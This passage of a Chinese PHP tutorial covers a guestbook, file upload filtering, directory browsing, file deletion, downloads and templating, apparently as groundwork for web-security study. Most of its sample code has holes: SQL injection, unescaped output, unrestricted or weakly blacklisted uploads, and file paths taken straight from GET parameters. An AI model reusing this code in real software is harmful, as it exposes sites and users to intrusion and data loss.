class="line">$_SESSION是一个关联数组，包含当前脚本中的所有session内容。</span><br></pre></td></tr></table></figure><h2 id="html混编"><a class="markdownIt-Anchor" href="#html混编"></a> html混编</h2><p>通过echo函数，可以将内容在html上进行输出，如果输出的内容是js函数，则会使得JS在PHP语言中运行</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(&#x27;</span>x<span class="string">&#x27;);&lt;/script&gt;&#x27;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="数据库操作"><a class="markdownIt-Anchor" href="#数据库操作"></a> 数据库操作</h1><p>参考：<a href="https://www.runoob.com/php/php-ref-mysqli.html">『菜鸟教程』PHP 5 MySQLi 函数</a></p><p>PHP使用mysqli函数函数实现MySQL数据库的增删改查操作</p><p><strong>操作数据库连接的php函数：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysqli_connect() 打开一个到MySQL的新的连接。</span><br><span class="line">mysqli_select_db() 更改连接的默认数据库。</span><br><span class="line">mysqli_query() 执行某个针对数据库的查询。</span><br><span class="line">mysqli_fetch_row() 从结果集中取得一行，并作为枚举数组返回。</span><br><span class="line">mysqli_close() 关闭先前打开的数据库连接。</span><br></pre></td></tr></table></figure><p><strong>执行的sql语句：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">增：insert into 表名(列名1, 列名2) value(‘列1值1’, ‘列2值2’);</span><br><span class="line">删：delete from 表名 where 列名 = ‘条件’;</span><br><span class="line">改：update 表名 set 列名 = 数据 where 列名 = ‘条件’;</span><br><span class="line">查：select * from 表名 where 列名=‘条件’;</span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=<span class="string">&quot;form1&quot;</span> name=<span class="string">&quot;form1&quot;</span> method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">  用户名：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> maxlength=<span class="string">&quot;2000&quot;</span>&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">  内容：</span><br><span class="line"></span><br><span class="line">  &lt;textarea id=<span class="string">&quot;content&quot;</span> rows=<span class="string">&quot;10&quot;</span> cols=<span class="string">&quot;70&quot;</span> name=<span class="string">&quot;content&quot;</span> style=<span class="string">&quot;border:1px solid #E5E5E5;&quot;</span>&gt;</span><br><span class="line">    &lt;/textarea&gt;</span><br><span class="line">    &lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">        UE.<span class="title function_ invoke__">getEditor</span>(<span class="string">&quot;content&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化编辑器传参,id为将要被替换的容器。</span></span><br><span class="line">    &lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> id=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add_gbook</span>(<span class="params"><span class="variable">$con</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$u</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$u</span>)) &#123;</span><br><span class="line">        <span class="variable">$c</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">        <span class="variable">$i</span> = @<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">        <span class="variable">$ua</span> = @<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;insert into gbook(`username`, `content`,`ipaddr`,`uagent`) value(&#x27;<span class="subst">$u</span>&#x27;, &#x27;<span class="subst">$c</span>&#x27;,&#x27;<span class="subst">$i</span>&#x27;,&#x27;<span class="subst">$ua</span>&#x27;);&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;留言成功！&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_gbook</span>(<span class="params"><span class="variable">$con</span>,<span class="variable">$del</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$sql1</span>=<span class="string">&quot;select * from gbook&quot;</span>;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql1</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;用户名：&#x27;</span>.<span class="variable">$row</span>[<span class="number">0</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;内容：&#x27;</span>.<span class="variable">$row</span>[<span class="number">1</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;IP地址：&#x27;</span>.<span class="variable">$row</span>[<span class="number">2</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;UA浏览器：&#x27;</span>.<span class="variable">$row</span>[<span class="number">3</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$del</span>==<span class="string">&#x27;del&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;gbook-admin.php?del=<span class="subst">$row</span>[0]&#x27;&gt;删除&lt;/a&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭数据库连接</span></span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$con</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="身份验证cookie-session和token"><a class="markdownIt-Anchor" href="#身份验证cookie-session和token"></a> 身份验证（Cookie、Session和Token）</h1><p>参考：<a href="https://blog.csdn.net/weixin_52376041/article/details/134309318">一文讲透Token与Cookie、Session的区别</a></p><h1 id="文件操作"><a class="markdownIt-Anchor" href="#文件操作"></a> 文件操作</h1><h2 id="文件上传"><a class="markdownIt-Anchor" href="#文件上传"></a> 文件上传</h2><h3 id="超全局变量-_files"><a class="markdownIt-Anchor" href="#超全局变量-_files"></a> 超全局变量 <code>$_FILES</code></h3><p><code>$_FILES</code> 是PHP中一个预定义的超全局变量，用于在上传文件时从客户端接收文件，并将其保存到服务器上。它是一个 <strong>关联数组</strong>，存储了上传文件的相关信息，如文件名、类型、大小、临时存储位置等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_FILES[“表单值”][“name”] 获取上传文件原始名称</span><br><span class="line">$_FILES[“表单值”][“type”] 获取上传文件MIME类型</span><br><span class="line">$_FILES[“表单值”][“size”] 获取上传文件字节单位大小</span><br><span class="line">$_FILES[“表单值”][“tmp_name”] 获取上传的临时副本文件名</span><br><span class="line">$_FILES[“表单值”][“error”] 获取上传时发生的错误代码</span><br></pre></td></tr></table></figure><h3 id="文件上传过滤"><a class="markdownIt-Anchor" href="#文件上传过滤"></a> 文件上传过滤</h3><ol><li><p><strong>无过滤机制</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;f&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$type</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;f&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line"><span class="variable">$size</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;f&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line"><span class="variable">$tmp_name</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;f&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$error</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;f&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$type</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$size</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$tmp_name</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$error</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>,<span class="string">&#x27;upload/&#x27;</span>.<span class="variable">$name</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;文件上传成功!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>黑名单过滤机制</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义上传文件后缀的黑名单</span></span><br><span class="line"><span class="variable">$black_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;asp&#x27;</span>,<span class="string">&#x27;jsp&#x27;</span>,<span class="string">&#x27;aspx&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$fenge</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$name</span>);</span><br><span class="line"><span class="variable">$exts</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$fenge</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$exts</span>,<span class="variable">$black_ext</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;非法后缀文件&#x27;</span>.<span class="variable">$exts</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>,<span class="string">&#x27;upload/&#x27;</span>.<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(&quot;上传成功&quot;)&lt;/script&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>explode 函数分割文件名 <code>$name</code> 并返回数组 <code>$fenge</code></li><li>end() 函数用于返回数组的最后一个元素，即拓展名</li></ul></li><li><p><strong>白名单过滤机制</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义上传文件后缀的白名单</span></span><br><span class="line"><span class="variable">$allow_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;jpeg&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$fenge</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$name</span>);</span><br><span class="line"><span class="variable">$exts</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$fenge</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$exts</span>,<span class="variable">$allow_ext</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;非法后缀文件&#x27;</span>.<span class="variable">$exts</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>,<span class="string">&#x27;upload/&#x27;</span>.<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(&quot;上传成功&quot;)&lt;/script&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><strong>文件类型过滤机制</strong></p><p>直接根据数据包的上传文件 <code>MIME</code> 类型 <code>Content-Type</code> 判断</p><blockquote><p>前面几种方法都是根据文件名称后缀进行判断</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$allow_type = array(&#x27;image/png&#x27;, &#x27;image/jpg&#x27;, &#x27;image/jpeg&#x27;, &#x27;image/gif&#x27;);</span><br><span class="line"></span><br><span class="line">if (!in_array($type, $allow_type)) &#123;</span><br><span class="line">    echo &#x27;非法后缀文件&#x27;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    move_uploaded_file($tmp_name, &#x27;upload/&#x27; . $name);</span><br><span class="line">    echo &#x27;&lt;script&gt;alert(&quot;上传成功&quot;)&lt;/script&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h3 id="文件上传的安全性"><a class="markdownIt-Anchor" href="#文件上传的安全性"></a> 文件上传的安全性</h3><ol><li><p>文件上传的存储</p><p>1）上传至服务器本身的存储磁盘，和源码放在一起<br />2）通过云产品OSS存储对象存储文件</p><ul><li><p>优点：无脚本执行环境，降低安全风险</p></li><li><p>缺点：如果前端源码泄露ak/sk，可以利用OSS浏览器、行云管家等工具进行bucket接管</p></li></ul></li></ol><h2 id="目录浏览"><a class="markdownIt-Anchor" href="#目录浏览"></a> 目录浏览</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 功能：</span></span><br><span class="line"><span class="comment">// 1.打开目录读取文件列表</span></span><br><span class="line"><span class="comment">// 2.递归循环读取文件列表</span></span><br><span class="line"><span class="comment">// 3.判断是文件还是文件夹</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>] ?: <span class="string">&#x27;./&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filelist</span>(<span class="params"><span class="variable">$dir</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$dh</span> = <span class="title function_ invoke__">opendir</span>(<span class="variable">$dir</span>))&#123;</span><br><span class="line">        <span class="keyword">while</span>((<span class="variable">$file</span>=<span class="title function_ invoke__">readdir</span>(<span class="variable">$dh</span>) )!== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">is_dir</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;li&gt;&lt;i class=&#x27;fa fa-folder&#x27;&gt;&lt;/i&gt; &lt;a href=&#x27;?path=<span class="subst">$file</span>&#x27;&gt;&quot;</span> . <span class="variable">$file</span> . <span class="string">&#x27;&lt;/a&gt;&lt;/li&gt;&#x27;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;li&gt;&lt;i class=&quot;fa fa-file&quot;&gt;&lt;/i&gt; &lt;a href=&quot;#&quot;&gt;&#x27;</span> . <span class="variable">$file</span> . <span class="string">&#x27;&lt;/a&gt;&lt;/li&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">filelist</span>(<span class="variable">$dir</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>通过 <code>$_GET['path']</code> 获取用户传递的目录路径，如果为空，则默认为当前目录 <code>./</code>。</li><li><strong><code>opendir($dir)</code></strong>：打开指定目录。</li><li><strong><code>readdir($dh)</code></strong>：循环读取目录中的文件和子目录。</li><li><strong><code>is_dir($file)</code></strong>：<ul><li><strong>如果是目录</strong>，显示文件夹图标并提供超链接（<code>?path=$file</code>）。</li><li><strong>如果是文件</strong>，显示文件图标，但只是普通文本。</li></ul></li></ul><p>显示效果：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20250219164443192.png" alt="image-20250219164443192" /></p><h2 id="文件删除"><a class="markdownIt-Anchor" href="#文件删除"></a> 文件删除</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">del</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;删除成功&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;del&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">del</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;del&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>文件删除方法：</p><ul><li><code>unlink()</code> ：删除 <code>$_GET['del']</code> 传入的文件路径。</li><li>调用 system shell_exec exec 命令</li></ul><h2 id="文件下载"><a class="markdownIt-Anchor" href="#文件下载"></a> 文件下载</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">down</span>(<span class="params"><span class="variable">$filepath</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$fileName</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$filepath</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: application/octet-stream&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=\&quot;&quot;</span> . <span class="variable">$fileName</span> . <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Length: &quot;</span> . <span class="title function_ invoke__">filesize</span>(<span class="variable">$filepath</span>));</span><br><span class="line">    <span class="title function_ invoke__">readfile</span>(<span class="variable">$filepath</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;down&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">down</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;down&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><code>$_GET['down']</code> 传入文件路径，使用 <code>readfile()</code> 读取并发送给浏览器下载。</li></ul><h2 id="文件编辑"><a class="markdownIt-Anchor" href="#文件编辑"></a> 文件编辑</h2><p>1、file_get_contents() 读取文件内容<br />2、fopen() fread() 文件打开读入</p><h2 id="文件包含"><a class="markdownIt-Anchor" href="#文件包含"></a> 文件包含</h2><p><strong>PHP 文件包含（File Inclusion）</strong> 即：允许一个 PHP 文件在执行时引入另一个 PHP 文件的内容，从而重用代码，避免重复编写相同的功能模块。</p><p>PHP 提供了四种主要的文件包含方式：</p><ul><li><p>include() ：如果文件不存在或路径错误，PHP 会发出警告，<strong>但脚本会继续执行</strong>。</p></li><li><p>require() ：如果包含的文件不存在或出错，<strong>脚本会终止执行</strong>。</p></li><li><p>include_once() 和 require_once() ：作用与 <code>include</code> 和 <code>require</code> 类似，但它们确保文件不会被重复包含。适用于 <strong>避免重复加载相同文件</strong>，尤其是包含<strong>函数定义或类定义的文件</strong>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;header.php&#x27;</span>;  <span class="comment">// 只包含一次</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;header.php&#x27;</span>;  <span class="comment">// 第二次不会再包含</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="模板引用"><a class="markdownIt-Anchor" href="#模板引用"></a> 模板引用</h1><h2 id="自定义模板引用"><a class="markdownIt-Anchor" href="#自定义模板引用"></a> 自定义模板引用</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// 引入配置文件</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"><span class="comment">// 从文件中读取HTML模板内容</span></span><br><span class="line">    <span class="variable">$template</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;new.html&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] ?<span class="string">&#x27; &#x27;</span>:<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;select * from news where id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 循环获取数据并赋值</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">        <span class="variable">$page_title</span>=<span class="variable">$row</span>[<span class="string">&#x27;1&#x27;</span>];</span><br><span class="line">        <span class="variable">$heading</span>=<span class="variable">$row</span>[<span class="string">&#x27;2&#x27;</span>];</span><br><span class="line">        <span class="variable">$subheading</span>=<span class="variable">$row</span>[<span class="string">&#x27;3&#x27;</span>];</span><br><span class="line">        <span class="variable">$content</span>=<span class="variable">$row</span>[<span class="string">&#x27;4&#x27;</span>];</span><br><span class="line">        <span class="variable">$item</span>=<span class="variable">$row</span>[<span class="string">&#x27;5&#x27;</span>];</span><br><span class="line">        <span class="comment">//echo $page_title;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$page_title</span>&lt;br&gt;<span class="subst">$page_title</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 替换模板中的占位符</span></span><br><span class="line">    <span class="variable">$template</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;page_title&#125;&#x27;</span>,<span class="variable">$page_title</span>,<span class="variable">$template</span>);</span><br><span class="line">    <span class="variable">$template</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;heading&#125;&#x27;</span>,<span class="variable">$subheading</span>,<span class="variable">$template</span>);</span><br><span class="line">    <span class="variable">$template</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;subheading&#125;&#x27;</span>,<span class="variable">$subheading</span>,<span class="variable">$template</span>);</span><br><span class="line">    <span class="variable">$template</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;content&#125;&#x27;</span>,<span class="variable">$content</span>,<span class="variable">$template</span>);</span><br><span class="line">    <span class="variable">$template</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;$item&#125;&#x27;</span>,<span class="variable">$item</span>,<span class="variable">$template</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 eval 